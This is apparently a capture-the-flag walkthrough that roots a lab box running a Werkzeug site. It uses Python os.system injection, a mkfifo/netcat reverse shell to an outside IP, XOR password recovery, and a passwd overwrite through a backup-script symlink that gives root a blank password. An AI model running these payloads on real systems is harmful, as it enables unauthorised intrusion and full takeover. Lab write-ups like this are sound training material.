Started with a nmap scan
```
22 OpenSSH 8.2p1
5000 upnp Werkzeug 2.1.2 Python 3.8.10
```
Going to the website it gives us the source code
Tested all the forums inputs for sqli
Looking in the code the `bisection` section of the site is vulnerable to injection the `xa` variable is the one we want it does not have checks and we can test this with this code 
	`__import__('os').system('touch test')#` 
and have to url encode what's in the system section we can get a rev shell from this with this
	`__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.8.255 9001 >/tmp/f')#`
So there is a script in the `/opt` folder gives a hash in XOR to decrypt this I encrypted my own hash and decoded it from base64 and then to decimal with the UTF8 key and then opened another windows in cyber chef with the key it gave me and did the same process and matched them to the hash it have us and it got us the key to decrypt it `superse.......` and now we got the password `G0th@m......` for the gordon user now that were on the user `gordon` there is a script that backups the reports folder so I copied the passwd file into the reports folder and then change the root login to this `root::0:0:root:/root:/bin/bash` and then removed the backups folder and then symlink it with this `ln 0s /etc/backups` and give it a couple minutes and we can su to root with no password 